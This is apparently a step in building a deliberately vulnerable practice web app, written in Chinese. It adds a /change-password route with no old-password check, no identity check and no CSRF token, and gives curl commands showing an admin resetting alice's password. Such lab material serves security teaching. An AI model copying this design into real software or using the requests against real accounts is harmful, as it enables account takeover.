# 步骤 14 — 密码修改功能 + 越权修改密码漏洞

> **新增功能:** 密码修改 `/change-password`  
> **漏洞类型:** 越权修改他人密码（无原密码验证）

---

## 一、新增功能

| 路由 | 方法 | 说明 |
|------|------|------|
| `/change-password` | POST | 修改用户密码，不验证原密码，不校验身份 |

### 修改的文件

| 文件 | 说明 |
|------|------|
| `app.py` | 新增 `/change-password` 路由 |
| `templates/profile.html` | 新增修改密码表单 |

---

## 二、漏洞详情

### 漏洞 1：越权修改他人密码

**测试：admin 登录后修改 alice 的密码**

```bash
curl -X POST -b cookies_admin.txt \
  -d "username=alice&new_password=hacked123" \
  "http://.../change-password"

# 用新密码登录 alice
curl -X POST -d "username=alice&password=hacked123" "http://.../login"
```

**结果：** 成功用新密码登录 alice，alice 的密码被他人修改。

### 漏洞 2：无需原密码

仅需提供 `username` 和 `new_password` 即可修改任意用户密码，不验证原密码。

### 漏洞 3：无 CSRF Token

表单无 CSRF Token，可被跨站请求伪造攻击。

---

## 三、测试结果

| 测试项 | 结果 |
|--------|:----:|
| 正常修改自己密码 | ✅ |
| 越权修改他人密码 | ✅ 成功 |
| 未登录无法修改 | ✅ 跳转登录页 |
| 个人中心含修改密码表单 | ✅ |
